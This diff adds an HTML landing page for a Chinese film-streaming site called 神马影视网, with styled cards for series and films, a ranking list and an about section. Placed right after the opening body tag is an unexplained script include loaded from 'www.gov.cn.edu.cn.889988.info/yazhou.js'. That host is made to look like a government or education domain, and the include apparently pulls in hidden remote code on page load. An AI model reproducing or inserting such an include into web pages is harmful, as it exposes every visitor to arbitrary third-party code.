@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>神马影视网｜海量高清影视剧集在线随心看 - shenmayingshiwang-app</title>
+<meta name="keywords" content="神马影视网,在线观看,高清电影,热播剧集,影视大全,韩剧,美剧,国产剧,动漫番剧,综艺节目,最新上映,影视资源">
+<meta name="description" content="神马影视网（shenmayingshiwang-app）专注提供海量高清电影、热播剧集、综艺动漫在线观看服务，每日更新最新影视资源，涵盖国产剧、韩剧、美剧、动漫番剧等丰富类型，随时随地畅享视听盛宴。">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#0a0a0f">
+<link rel="canonical" href="https://shenmayingshiwang-app.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --bg:#0a0a0f;--bg2:#12121c;--card:#171724;--line:#26263a;
+  --txt:#e8e8f0;--txt2:#9a9ab2;--brand:#ff2e63;--brand2:#ff7a45;
+  --gold:#f5c542;--ok:#2ec8a6;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--bg);color:var(--txt);
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  line-height:1.7;overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-2;
+  background:
+    radial-gradient(900px 500px at 12% -8%,rgba(255,46,99,.16),transparent 60%),
+    radial-gradient(800px 600px at 88% 12%,rgba(245,197,66,.09),transparent 55%),
+    radial-gradient(700px 700px at 50% 108%,rgba(46,200,166,.10),transparent 60%);
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 18px}
+
+/* header */
+.hd{position:sticky;top:0;z-index:99;background:rgba(10,10,15,.82);backdrop-filter:blur(14px);border-bottom:1px solid rgba(255,255,255,.06)}
+.hd-in{display:flex;align-items:center;justify-content:space-between;gap:14px;height:60px}
+.logo{display:flex;align-items:center;gap:10px;flex-shrink:0}
+.logo b{font-size:19px;letter-spacing:.5px;background:linear-gradient(90deg,var(--brand),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:800}
+.logo span{font-size:11px;color:var(--txt2);border:1px solid var(--line);border-radius:20px;padding:2px 8px}
+.nav{display:flex;gap:6px;align-items:center}
+.nav a{font-size:14px;color:var(--txt2);padding:7px 12px;border-radius:10px;transition:.2s}
+.nav a:hover{color:#fff;background:rgba(255,255,255,.07)}
+.mbtn{display:none;width:40px;height:40px;border:1px solid var(--line);border-radius:10px;background:var(--card);color:var(--txt);font-size:20px;cursor:pointer}
+
+/* hero */
+.hero{padding:56px 0 40px;text-align:center}
+.tag{display:inline-block;font-size:12px;color:var(--gold);border:1px solid rgba(245,197,66,.35);border-radius:30px;padding:5px 16px;margin-bottom:18px;letter-spacing:1px}
+.hero h1{font-size:clamp(26px,5.4vw,46px);line-height:1.25;font-weight:900;margin-bottom:16px}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--brand),var(--brand2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{max-width:660px;margin:0 auto 26px;color:var(--txt2);font-size:15px}
+.search{display:flex;max-width:560px;margin:0 auto;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:6px;gap:6px}
+.search input{flex:1;background:transparent;border:0;outline:0;color:var(--txt);padding:12px 14px;font-size:15px;min-width:0}
+.search button{background:linear-gradient(135deg,var(--brand),var(--brand2));border:0;color:#fff;font-size:15px;font-weight:600;border-radius:11px;padding:0 26px;cursor:pointer;white-space:nowrap}
+.hero-meta{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;margin-top:26px}
+.hero-meta i{font-style:normal;font-size:13px;color:var(--txt2);background:var(--card);border:1px solid var(--line);border-radius:10px;padding:7px 14px}
+
+/* section */
+.sec{padding:46px 0}
+.sec-h{display:flex;align-items:flex-end;justify-content:space-between;gap:14px;margin-bottom:24px;flex-wrap:wrap}
+.sec-h h2{font-size:23px;font-weight:800;display:flex;align-items:center;gap:10px}
+.sec-h h2::before{content:"";width:5px;height:22px;border-radius:4px;background:linear-gradient(var(--brand),var(--gold))}
+.sec-h a{font-size:13px;color:var(--brand);white-space:nowrap}
+.sec-h a:hover{text-decoration:underline}
+
+/* grid */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.25s;display:flex;flex-direction:column}
+.card:hover{transform:translateY(-5px);border-color:rgba(255,46,99,.45);box-shadow:0 14px 34px rgba(255,46,99,.12)}
+.thumb{position:relative;aspect-ratio:3/4;overflow:hidden;background:#1d1d2c}
+.thumb img{width:100%;height:100%;object-fit:cover;transition:.4s}
+.card:hover .thumb img{transform:scale(1.07)}
+.badge{position:absolute;top:10px;left:10px;font-size:11px;font-weight:600;color:#fff;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);border-radius:7px;padding:3px 9px}
+.score{position:absolute;top:10px;right:10px;font-size:12px;font-weight:700;color:#1a1a25;background:var(--gold);border-radius:7px;padding:3px 8px}
+.cat{position:absolute;bottom:0;left:0;right:0;padding:10px;background:linear-gradient(transparent,rgba(0,0,0,.85));font-size:12px;color:#ddd}
+.info{padding:13px 14px;flex:1;display:flex;flex-direction:column;gap:5px}
+.info h3{font-size:15px;font-weight:700;line-height:1.4;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical;overflow:hidden}
+.info p{font-size:12.5px;color:var(--txt2);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+
+/* list row */
+.list{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.row{display:flex;gap:14px;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:12px;transition:.2s}
+.row:hover{border-color:rgba(245,197,66,.4);background:#1b1b2a}
+.num{font-size:20px;font-weight:900;color:var(--line);min-width:30px;transition:.2s}
+.row:hover .num{color:var(--gold)}
+.row-b{flex:1;min-width:0}
+.row-b h3{font-size:15px;margin-bottom:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.row-b p{font-size:12.5px;color:var(--txt2)}
+.row-b .tags{display:flex;gap:6px;flex-wrap:wrap;margin-top:7px}
+.row-b .tags i{font-style:normal;font-size:11px;color:var(--ok);background:rgba(46,200,166,.12);border-radius:5px;padding:2px 7px}
+
+/* types */
+.types{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.type{border-radius:16px;padding:22px 18px;min-height:130px;display:flex;flex-direction:column;justify-content:space-between;transition:.25s;cursor:pointer;border:1px solid transparent}
+.type:hover{transform:translateY(-4px)}
+.t1{background:linear-gradient(150deg,#2b1336,#150a1c)}.t1:hover{border-color:#a855f7}
+.t2{background:linear-gradient(150deg,#0f2b36,#0a151c)}.t2:hover{border-color:#22d3ee}
+.t3{background:linear-gradient(150deg,#361c0f,#1c100a)}.t3:hover{border-color:#fb923c}
+.t4{background:linear-gradient(150deg,#1a2e15,#0c150a)}.t4:hover{border-color:#4ade80}
+.type h3{font-size:17px}
+.type p{font-size:12.5px;color:var(--txt2);margin-top:6px}
+.type em{font-style:normal;font-size:11px;color:var(--gold)}
+
+/* about */
+.about{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:30px;display:grid;grid-template-columns:1.4fr 1fr;gap:30px;align-items:center}
+.about h2{font-size:22px;margin-bottom:12px}
+.about p{color:var(--txt2);font-size:14.5px;margin-bottom:12px}
+.feat{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-top:18px}
+.feat div{background:rgba(255,255,255,.03);border:1px solid var(--line);border-radius:12px;padding:14px}
+.feat b{display:block;font-size:15px;margin-bottom:3px}
+.feat span{font-size:12.5px;color:var(--txt2)}
+.stat{display:flex;flex-direction:column;gap:16px}
+.stat div{background:var(--bg2);border-radius:16px;padding:20px;text-align:center;border:1px solid var(--line)}
+.stat strong{display:block;font-size:32px;font-weight:900;background:linear-gradient(90deg,var(--brand),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat span{font-size:13px;color:var(--txt2)}
+
+/* footer */
+.ft{border-top:1px solid var(--line);padding:36px 0 26px;margin-top:30px}
+.ft-top{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap;align-items:flex-start}
+.ft-logo b{font-size:18px;background:linear-gradient(90deg,var(--brand),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:800}
+.ft-logo p{font-size:12.5px;color:var(--txt2);margin-top:6px;max-width:320px}
+.ft-links{display:flex;gap:20px;flex-wrap:wrap}
+.ft-links a{font-size:13px;color:var(--txt2)}
+.ft-links a:hover{color:var(--brand)}
+.ft-bot{margin-top:26px;padding-top:18px;border-top:1px dashed var(--line);display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-size:12.5px;color:#6c6c84}
+.ft-bot a{color:#6c6c84}
+.ft-bot a:hover{color:var(--brand)}
+
+/* back top */
+.top{position:fixed;right:16px;bottom:22px;width:44px;height:44px;border-radius:50%;background:var(--card);border:1px solid var(--line);color:var(--txt);font-size:17px;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:90;opacity:0;pointer-events:none;transition:.3s;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.top.show{opacity:1;pointer-events:auto}
+
+/* responsive */
+@media(max-width:900px){
+  .grid{grid-template-columns:repeat(3,1fr)}
+  .types{grid-template-columns:repeat(2,1fr)}
+  .about{grid-template-columns:1fr;padding:24px}
+}
+@media(max-width:640px){
+  .hd-in{height:54px}
+  .logo b{font-size:16px}
+  .logo span{display:none}
+  .nav{position:fixed;top:54px;left:0;right:0;flex-direction:column;background:rgba(14,14,22,.98);backdrop-filter:blur(14px);padding:14px;gap:4px;border-bottom:1px solid var(--line);transform:translateY(-130%);transition:.3s;box-shadow:0 12px 30px rgba(0,0,0,.5)}
+  .nav.open{transform:translateY(0)}
+  .nav a{width:100%;text-align:center;padding:12px;border-radius:10px}
+  .mbtn{display:flex;align-items:center;justify-content:center}
+  .hero{padding:34px 0 26px}
+  .search button{padding:0 16px;font-size:14px}
+  .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+  .list{grid-template-columns:1fr;gap:12px}
+  .types{grid-template-columns:1fr;gap:12px}
+  .about{padding:20px}
+  .feat{grid-template-columns:1fr}
+  .sec{padding:34px 0}
+  .ft-top{flex-direction:column}
+  .ft-links{gap:14px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="hd">
+  <div class="wrap hd-in">
+    <div class="logo">
+      <b>神马影视网</b>
+      <span>shenmayingshiwang-app</span>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#tv">热播剧集</a>
+      <a href="#movie">电影推荐</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="mbtn" id="mbtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero wrap" id="home">
+  <span class="tag">✦ 每日更新 · 全网高清影视资源聚合</span>
+  <h1>神马影视网，<em>海量好剧</em>一键直达</h1>
+  <p>汇聚院线大片、热播国剧、经典美剧韩剧、人气动漫与综艺，高清流畅播放，无需等待即可开启沉浸式观影体验。</p>
+  <form class="search" onsubmit="event.preventDefault();">
+    <input type="search" placeholder="搜索影片名称、演员、类型…" aria-label="搜索">
+    <button type="submit">搜 索</button>
+  </form>
+  <div class="hero-meta">
+    <i>🔥 今日更新 38 部</i>
+    <i>🎬 高清蓝光源</i>
+    <i>📱 多端自适应</i>
+    <i>⚡ 极速加载</i>
+    <i>💬 弹幕互动</i>
+  </div>
+</section>
+
+<!-- 热播剧集 -->
+<section class="sec wrap" id="tv">
+  <div class="sec-h">
+    <h2>热播剧集</h2>
+    <a href="#">查看完整剧单 ›</a>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="thumb">
+        <img src="https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?auto=format&fit=crop&w=400&q=70" alt="都市悬疑剧">
+        <span class="badge">国产剧</span><span class="score">9.2</span>
+        <span class="cat">悬疑 · 犯罪 · 38集全</span>
+      </div>
+      <div class="info">
+        <h3>暗夜追凶·第三季</h3>
+        <p>一桩离奇连环案牵出十年旧案，刑警队长与法医联手抽丝剥茧，真相远比想象更残酷。</p>
+      </div>
+    </article>
+    <article class="card">
+      <div class="thumb">
+        <img src="https://images.unsplash.com/photo-1518930259200-3e6dd2a8bbc8?auto=format&fit=crop&w=400&q=70" alt="古装权谋剧">
+        <span class="badge">国产剧</span><span class="score">8.9</span>
+        <span class="cat">古装 · 权谋 · 更新至32集</span>
+      </div>
+      <div class="info">
+        <h3>凤鸣九天</h3>
+        <p>乱世之中，一代女相以智谋安天下，朝堂博弈与儿女情长交织出一段荡气回肠的传奇。</p>
+      </div>
+    </article>
+    <article class="card">
+      <div class="thumb">
+        <img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?auto=format&fit=crop&w=400&q=70" alt="韩剧">
+        <span class="badge">韩剧</span><span class="score">9.5</span>
+        <span class="cat">爱情 · 治愈 · 16集全</span>
+      </div>
+      <div class="info">
+        <h3>春日便利店</h3>
+        <p>首尔街角的小小便利店，见证着每一个深夜归人的故事，温暖治愈每一个疲惫的灵魂。</p>
+      </div>
+    </article>
+    <article class="card">
+      <div class="thumb">
+        <img src="https://images.unsplash.com/photo-1598899134739-24c46f58b8c0?auto=format&fit=crop&w=400&q=70" alt="美剧">
+        <span class="badge">美剧</span><span class="score">8.7</span>
+        <span class="cat">科幻 · 惊悚 · 更新至10集</span>
+      </div>
+      <div class="info">
+        <h3>时空回音</h3>
+        <p>量子实验意外打开时间裂缝，一支科研小队必须在平行时空崩塌前找到回家的路。</p>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- 电影推荐 -->
+<section class="sec wrap" id="movie">
+  <div class="sec-h">
+    <h2>电影推荐</h2>
+    <a href="#">更多院线大片 ›</a>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="thumb">
+        <img src="https://images.unsplash.com/photo-1574267432553-4b4628081c31?auto=format&fit=crop&w=400&q=70" alt="动作电影">
+        <span class="badge">动作</span><span class="score">8.8</span>
+        <span class="cat">院线大片 · 128分钟</span>
+      </div>
+      <div class="info">
+        <h3>破晓行动</h3>
+        <p>跨国缉毒行动中，卧底警察身份暴露，一场横跨三国的生死追逐就此展开。</p>
+      </div>
+    </article>
+    <article class="card">
+      <div class="thumb">
+        <img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?auto=format&fit=crop&w=400&q=70" alt="喜剧电影">
+        <span class="badge">喜剧</span><span class="score">8.4</span>
+        <span class="cat">贺岁喜剧 · 112分钟</span>
+      </div>
+      <div class="info">
+        <h3>那年我们一起追的假期</h3>
+        <p>一群老同学毕业十年后重聚海岛，笑泪交织的旅程让他们重新找回了初心。</p>
+      </div>
+    </article>
+    <article class="card">
+      <div class="thumb">
+        <img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?auto=format&fit=crop&w=400&q=70" alt="动画电影">
+        <span class="badge">动画</span><span class="score">9.3</span>
+        <span class="cat">国漫 · 家庭 · 105分钟</span>
+      </div>
+      <div class="info">
+        <h3>山海少年志</h3>
+        <p>少年误入山海经异兽世界，在冒险中领悟勇气与担当，国产动画诚意之作。</p>
+      </div>
+    </article>
+    <article class="card">
+      <div class="thumb">
+        <img src="https://images.unsplash.com/photo-1505686994434-e3cc5abf1330?auto=format&fit=crop&w=400&q=70" alt="纪录片">
+        <span class="badge">纪录</span><span class="score">9.1</span>
+        <span class="cat">自然 · 人文 · 6集全</span>
+      </div>
+      <div class="info">
+        <h3>蔚蓝深处</h3>
+        <p>历时三年跟拍全球四大洋，呈现海洋生态的壮丽与脆弱，唤醒守护蓝色星球的意识。</p>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- 榜单 -->
+<section class="sec wrap">
+  <div class="sec-h">
+    <h2>热搜榜 · 大家都在看</h2>
+    <a href="#">完整榜单 ›</a>
+  </div>
+  <div class="list">
+    <a class="row" href="#">
+      <span class="num">01</span>
+      <div class="row-b">
+        <h3>沉默的真相·特别版</h3>
+        <p>尘封多年的旧案因一封匿名信被重新翻出，正义或许会迟到但绝不会缺席。</p>
+        <div class="tags"><i>悬疑</i><i>犯罪</i><i>高分口碑</i></div>
+      </div>
+    </a>
+    <a class="row" href="#">
+      <span class="num">02</span>
+      <div class="row-b">
+        <h3>星际迷航：新纪元</h3>
+        <p>星际舰队遭遇未知文明，舰长带领船员在危机四伏的宇宙中寻找人类文明的新方向。</p>
+        <div class="tags"><i>科幻</i><i>冒险</i><i>视效震撼</i></div>
+      </div>
+    </a>
+    <a class="row" href="#">
+      <span class="num">03</span>
+      <div class="row-b">
+        <h3>人间烟火气</h3>
+        <p>从清晨的菜市场到深夜的大排档，镜头记录中国十二座城市最真实的人间烟火。</p>
+        <div class="tags"><i>纪录片</i><i>人文</i><i>治愈</i></div>
+      </div>
+    </a>
+    <a class="row" href="#">
+      <span class="num">04</span>
+      <div class="row-b">
+        <h3>恋爱练习题</h3>
+        <p>欢喜冤家被迫同居，在一百天的"恋爱实验"里，他们能否真的走到一起？</p>
+        <div class="tags"><i>都市</i><i>爱情</i><i>甜宠</i></div>
+      </div>
+    </a>
+    <a class="row" href="#">
+      <span class="num">05</span>
+      <div class="row-b">
+        <h3>机械之心</h3>
+        <p>未来世界里人类与AI共存，一名维修师发现自己的记忆可能是被伪造的。</p>
+        <div class="tags"><i>科幻</i><i>烧脑</i><i>高分</i></div>
+      </div>
+    </a>
+    <a class="row" href="#">
+      <span class="num">06</span>
+      <div class="row-b">
+        <h3>味蕾上的乡愁</h3>
+        <p>海外游子回乡寻味，用一道道家常菜串联起三代人的情感羁绊与时代变迁。</p>
+        <div class="tags"><i>美食</i><i>亲情</i><i>温情</i></div>
+      </div>
+    </a>
+  </div>
+</section>
+
+<!-- 分类导航 -->
+<section class="sec wrap">
+  <div class="sec-h">
+    <h2>频道分类</h2>
+    <a href="#">全部频道 ›</a>
+  </div>
+  <div class="types">
+    <a class="type t1" href="#">
+      <div><em>HOT</em><h3>国产好剧</h3><p>热门国剧 · 经典老剧 · 独家自制</p></div>
+      <span>2,480 部 ›</span>
+    </a>
+    <a class="type t2" href="#">
+      <div><em>NEW</em><h3>海外剧场</h3><p>美剧 · 韩剧 · 日剧 · 泰剧同步更新</p></div>
+      <span>1,960 部 ›</span>
+    </a>
+    <a class="type t3" href="#">
+      <div><em>VIP</em><h3>院线大片</h3><p>动作 · 喜剧 · 科幻 · 惊悚任你选</p></div>
+      <span>3,120 部 ›</span>
+    </a>
+    <a class="type t4" href="#">
+      <div><em>FUN</em><h3>动漫综艺</h3><p>国漫日漫番剧 · 热门综艺合集</p></div>
+      <span>1,730 部 ›</span>
+    </a>
+  </div>
+</section>
+
+<!-- 关于本站 -->
+<section class="sec wrap" id="about">
+  <div class="about">
+    <div>
+      <h2>关于 神马影视网</h2>
+      <p>神马影视网（shenmayingshiwang-app）是一个专注影视内容发现与分享的在线平台，致力于帮助每一位影迷快速找到想看的好作品。</p>
+      <p>无论你是悬疑剧控、科幻迷、动漫粉还是纪录片爱好者，这里都能为你精准匹配优质片源，并提供剧情简介、主演信息、评分参考和同类型推荐。</p>
+      <div class="feat">
+        <div><b>🎯 精选推荐</b><span>专业编辑团队每日精选高分好片</span></div>
+        <div><b>🖥️ 多端适配</b><span>手机、平板、电脑无缝切换观看</span></div>
+        <div><b>⚡ 极速体验</b><span>轻量架构秒开页面，告别漫长等待</span></div>
+        <div><b>🔔 更新提醒</b><span>订阅追剧，更新第一时间通知你</span></div>
+      </div>
+    </div>
+    <div class="stat">
+      <div><strong>12,000+</strong><span>收录影视作品</span></div>
+      <div><strong>38 部/日</strong><span>每日新增更新</span></div>
+      <div><strong>9.4 分</strong><span>平均用户评分</span></div>
+    </div>
+  </div>
+</section>
+
+<footer class="ft">
+  <div class="wrap">
+    <div class="ft-top">
+      <div class="ft-logo">
+        <b>神马影视网</b>
+        <p>专注影视内容发现，让每一次打开都有好片相伴。本站仅提供影视信息聚合与分享，所有资源版权归原作者及发行方所有。</p>
+      </div>
+      <div class="ft-links">
+        <a href="#home">首页</a>
+        <a href="#tv">热播剧集</a>
+        <a href="#movie">电影推荐</a>
+        <a href="#about">关于本站</a>
+        <a href="#">免责声明</a>
+        <a href="#">联系我们</a>
+      </div>
+    </div>
+    <div class="ft-bot">
+      <span>© 2026 神马影视网 shenmayingshiwang-app 版权所有</span>
+      <span>网站地址：<a href="https://shenmayingshiwang-app.github.io">https://shenmayingshiwang-app.github.io</a></span>
+    </div>
+  </div>
+</footer>
+
+<div class="top" id="top" aria-label="返回顶部">↑</div>
+
+<script>
+(function(){
+  var nav=document.getElementById('nav'),btn=document.getElementById('mbtn'),top=document.getElementById('top');
+  btn.addEventListener('click',function(){nav.classList.toggle('open')});
+  nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open')});
+  window.addEventListener('scroll',function(){
+    if(window.scrollY>400)top.classList.add('show');else top.classList.remove('show');
+  });
+  top.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+})();
+</script>
+</body>
+</html>
